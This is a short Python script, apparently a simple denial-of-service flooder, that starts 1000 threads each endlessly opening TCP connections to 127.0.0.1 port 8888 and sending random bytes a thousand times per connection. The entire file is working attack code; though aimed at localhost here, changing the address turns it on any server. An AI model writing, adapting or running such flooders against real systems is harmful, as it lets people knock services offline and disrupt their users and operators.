import random
import socket
import threading

times = 1000
threads = 1000


def dos():
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('127.0.0.1', 8888))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + " Sent...")
        except:
            s.close()
            print("Error")


if __name__ == '__main__':
    for i in range(threads):
        t = threading.Thread(target=dos)
        t.start()

